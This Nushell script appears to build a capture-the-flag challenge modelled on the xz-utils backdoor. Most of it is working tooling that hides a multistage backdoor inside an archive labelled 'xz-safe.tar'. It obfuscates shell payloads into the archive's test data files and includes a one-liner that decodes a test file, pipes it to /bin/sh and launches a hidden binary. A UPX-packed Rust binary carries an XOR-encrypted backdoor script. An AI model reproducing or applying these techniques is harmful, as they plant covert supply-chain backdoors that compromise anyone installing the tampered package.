use std assert;

# The XZ toolkit
export def tk [] { help tk }

# Extraction tools
def "tk extract" [] { help tk extract }
# Obfuscation tools
def "tk obfuscate" [] { help tk obfuscate }

# Print a message to the console. Supports multiple arguments (unlike `print`).
def "msg" [
    ...args, # Arguments to print
    --no-newline (-n) # Do not print a newline
]: nothing -> nothing {
    if $env.verbose? != null {
        $args | enumerate | each { |x|
            print -n (match ($x.item | describe) {
                "int" => { $"(ansi green)($x.item)(ansi reset)" },
                "float" => { $"(ansi blue)($x.item)(ansi reset)" },
                "bool" => { $"(ansi yellow)($x.item)(ansi reset)" },
                _ => { $x.item }
            })
            let next = $args | get -i ($x.index + 1)
            if next == null { return }
            let inline = ["string", "float", "int", "bool"]
            print -n (if ($next | describe) in $inline and ($x.item | describe) in $inline { " " } else { "\n" })
        }
    }
    if not $no_newline { print }
    null
}

# Both of those *have* to be set.
let XZ_VERSION = "5.6.0"
let srcdir = $"(pwd)/MALICIOUS-xz/xz-5.6.0/"
try { ls $srcdir } catch {
    msg "Downloading xz source..."
    mkdir MALICIOUS-xz
    do {
        cd MALICIOUS-xz
        ( http get http://web.archive.org/web/20240329215450if_/https://objects.githubusercontent.com/github-production-release-asset-2e65be/553665726/5232d02d-aaa9-4aa3-87c9-43a266333be4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240329%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T215449Z&X-Amz-Expires=300&X-Amz-Signature=2351591a5e71d0e04f8258570f236de77c6f0d3b95156ed67cd11fec83a312d1&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=553665726&response-content-disposition=attachment%3B%20filename%3Dxz-5.6.0.tar.xz&response-content-type=application%2Foctet-stream
            | save -f xz-5.6.0.tar.xz )
        tar xf xz-5.6.0.tar.xz
    }
}

# stage1 payload is the original xz payload
let stage2_payload = "cat tests/files/bad-3-corrupt_lzma2.xz|tr '\\t _\\-' ' \\t\\-_'|xz -d|sed 's/|t.\\{,\\}/)>x/g'|/bin/sh;chmod +x x;nohup ./x&"
# stage3 is the rust binary, source code in rust-binary/, generated with tk obfuscate stage3_binary
let stage4_payload = open backdoor.sh

# Run docker container for testing
def "tk run-docker" [
    --update (-u) # update the malicious xz archive
]: nothing -> nothing {
    if ($update) { msg Updating payload...; tk obfuscate full }
    msg Running Docker container...
    mkdir $"(pwd)/docker"
    try { ls flag.txt } catch { "GPN{FAKE_FLAG}" | save flag.txt }
    docker build --network=host -t ((pwd|path basename) + "x") .
    docker run -it --network=host -v $"(pwd)/docker:/docker" ((pwd|path basename) + "x")
}

# Obfuscate a shell script and make it the entrypoint.
# This is used to generate Jia Tan's tests/files/bad-3-corrupt_lzma2.xz.
# Override that file to inject an entrypoint into a malicious xz archive.
def "tk obfuscate entrypoint" []: string -> string {(
    $in | 
    xz -z | 
    tr ' \t\-_' '\t _\-'
)}

# Extract the entrypoint payload. Useful for re-obfuscating
# stage two. Extracts tests/files/bad-3-corrupt_lzma2.xz
def "tk extract entrypoint" []: string -> string {(
    open $"($srcdir)/tests/files/bad-3-corrupt_lzma2.xz" |
    tr '\t _\-' ' \t\-_' |
    xz -d |
    decode
)}

# Dump offsets from the stage2 payload deciphering algorithm.
def "tk extract stage2-offsets" []: string -> record {
    let ep = tk extract entrypoint
    let heads = (
        $ep |
        parse '{_}i="({src})"{_}' |
        get src | 
        split row " && " | 
        each { |call| {
            offset: ($call | parse -r '(\d+)' | get capture0.0 | into int),
            skip: (($call | parse -r '(^\()' | length) == 1)
        } }
    )
    let tail = (
        $ep |
        parse '{_}tail -c +{len}|{_}' | get len.0 | into int
    ) - 1 # fix stupid OBO in tail

    return {heads: $heads, tail: $tail}
}

# Perform a padded xz compression to reach a target size.
def "tk padded-xz" [
    target: int # target size in bytes
    --nonce-sep = " # " # separator for nonce
    --nonce-tr = ['\n\r', 'aa'] # tr arguments for nonce
]: binary -> binary {
    let input = [($in | into binary) ($nonce_sep | into binary)] | bytes collect
    msg Doing padded XZ...
    def compress [--pad-to: int]: binary -> binary {
        let input = $in
        let pad = $pad_to - ($input | bytes length)
        assert ($pad > 0) ($"input [($input | bytes length)] has to be shorter than the target [($target)]")
        let res = ([
            ($input)
            (head -c $pad /dev/urandom | tr ...$nonce_tr | into binary)
        ] | bytes collect | xz -F raw --lzma1 -zc | into binary)
        return $res
    }
    msg > Calculating overshoot...
    let overshoot = (
        0..<8 |
        par-each { return (
            $input |
            compress --pad-to $target |
            bytes length
        ) } |
        math avg |
        into int
    ) - $target
    msg > Overshoot is ~ $overshoot
    msg > Brute-forcing compression...
    mut res = 0x[]
    loop {
        let attempts = (
            0..<4 |
            par-each { return (
                $input | compress --pad-to ($target - $overshoot)
            ) } |
            filter { ($in | bytes length) == $target }
        )
        if (($attempts | length) > 0) {
            $res = $attempts.0
            break
        }
    }
    msg > Valid compression padding found!
    return $res
}

# Undo the head padding from the stage2 payload.
def "tk unpad_offsets" [
    offsets: table, # Offset table to use (same format as tk extract stage2-offsets)
    --padding: binary = 0x[] # Padding to use (might be useful to put stuff there)
]: binary -> binary {
    mut input = $in
    msg Unpadding offsets...
    mut padding = if $padding == 0x[] { head -c100K /dev/urandom | into binary } else { $padding }
    mut output = 0x[]

    for o in $offsets {
        if $o.skip {
            $output = ($output | bytes add --end ($padding | bytes at 0..$o.offset))
            $padding = ($padding | bytes at $o.offset..)
        } else {
            $output = ($output | bytes add --end ($input | bytes at 0..$o.offset))
            $input = ($input | bytes at $o.offset..)
        }
    }

    return ($output)
}

# Obfuscate a shell script for stage two of the xz exploit chain.
# This is used to generate Jia Tan's tests/files/good-large_compressed.lzma.
def "tk obfuscate stage2" [
    --run (-r) # Run the payload after generating it
    --padding: binary = 0x[] # Padding to use (might be useful to put stuff there)
]: binary -> binary {
    let input = $in
    msg Obfuscating stage2 payload...

    def "rand" [count: int]: nothing -> binary {
        0..$count | each { (random int | into binary) } | bytes collect | bytes at 0..$count
    }

    msg > Collecting data...

    let offsets = tk extract stage2-offsets
    let total_size = $offsets.heads | filter { not $in.skip } | math sum | get offset
    let payload_size = $total_size - $offsets.tail
    let pad_start_len = ($offsets.tail - ($padding | bytes length))
    assert ($pad_start_len >= 0) ($"padding is too long [($padding | bytes length)/($offsets.tail)]")
    let pad_start = [$padding (rand $pad_start_len)] | bytes collect

    msg > Building payload...
    let xzd = $input | tk padded-xz $offsets.tail
    let trd = $xzd | tr '\0-\377' '\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131' | into binary
    mut padded = [ $pad_start $trd ] | bytes collect
    let hacked = $padded | tk unpad_offsets $offsets.heads
    let packed = $hacked | xz -zc

    msg > stage2 obfuscated!

    if $run {
        $packed | save -f s2.lzma
        bash s2-runner.sh        
    } else {
        return $packed
    }
}

# Do an XOR cipher. Loops the key around.
def "xor-cipher" [
    payload: binary, # Payload to encrypt
    key: binary # Key to XOR with
] {
    $payload | bits xor (
        $payload | 
        bytes length | 
        $in / ($key | bytes length) | 
        math ceil | 
        0..<$in | 
        each { $key } | 
        bytes collect | 
        bytes at ($payload | bytes length | 0..$in)
    )
}

# Create the Rust binary for stage 3.
def "tk obfuscate stage3_binary" []: nothing -> binary {
    msg Obfuscating stage3 binary...
    def compile [] {
        msg > Running rustc...
        do {
            cd rust-binary
            msg > Starting container...
            docker build --network=host -t (pwd|path basename) .
            docker run -it --network=host -v $"(pwd):/wd" (pwd|path basename)
            rm -f target/x86_64-unknown-linux-gnu/release/rust-binary-upx
            msg > Compressing binary...
            /nix/store/was3lq103hkknk9y5z3jqaick03fqbns-upx-4.2.0/bin/upx --best --ultra-brute --overlay=strip target/x86_64-unknown-linux-gnu/release/rust-binary -o target/x86_64-unknown-linux-gnu/release/rust-binary-upx
        }
    }

    def dump_key [] {
        msg > Dumping offsets...
        # i refuse to use ghidra
        let binary = open rust-binary/target/x86_64-unknown-linux-gnu/release/rust-binary | into binary
        let length = $binary | bytes length
        let magic_string = 0x[415e c30f 0b55 4157 4156]
        let magic_offset = 5
        let ranges = 0..$length | each { |r| $binary | bytes at $r..($r + 32) }
        let offset = ($ranges | enumerate | filter { ($in.item | bytes at 0..8) == ($magic_string | bytes at 0..8) } | do { msg > Found offset! $in; $in } | get 0.index) + $magic_offset
        let main_bytes = $ranges | get $offset
        return $main_bytes
    }

    def encrypt [pk: binary] {
        msg > Adding encrypted stage4...
        # XOR cipher > base64 decode > xz decompress > /bin/sh
        $stage4_payload | base64 | into binary | xor-cipher $in $pk | save -f rust-binary/src/backdoor.xz.enc
    }

    msg > Compiling template binary...
    encrypt 0x[11 22 33 44]
    compile
    let key = dump_key
    msg > Compiling main binary...
    encrypt $key
    compile
    msg > Encrypted with key: $key

    return (open rust-binary/target/x86_64-unknown-linux-gnu/release/rust-binary-upx | into binary)
}

# Make an archive that looks similar to the release builds, but apply the
# provided function to the archive.
def "tk obfuscate gen_archive" [
    fun: closure # A closure that is passed a directory where the archive is extracted
] {
    msg Generating archive...
    let dir = $"/tmp/build-(random chars)/"
    let out = $"/tmp/xz-($XZ_VERSION)-5.6.0-(random chars).tar"
    let start = (pwd)
    mkdir $dir
    do { cd $dir; tar xf $"($start)/MALICIOUS-xz/xz-($XZ_VERSION).tar.xz" }
    do $fun $dir
    do { cd $dir; tar cf $out . }
    rm -rf $dir
    $out
}

# Build the full obfuscation chain.
def "tk obfuscate full" [] {
    msg Building full obfuscation chain...
    
    let file = tk obfuscate gen_archive { |dir|
    # screen -S x -d -m 
        $stage2_payload | into binary | tk obfuscate stage2 --padding (tk obfuscate stage3_binary) | save -f $"($dir)/xz-($XZ_VERSION)/tests/files/good-large_compressed.lzma"
    }
    cp -f $file ./xz-safe.tar
    msg "Built to ./xz-safe.tar"
}

# Generate the archive for the challenge.
def "tk gen-chall-archive" [
    --flag: string = "GPN{FAKE_FLAG}" # Flag to include in the archive
] {
    msg Generating challenge archive...
    tk obfuscate full
    $flag | save -f flag.txt
    tar cf xz-challenge.tar xz-safe.tar flag.txt Dockerfile
    msg "Built to ./xz-challenge.tar"
}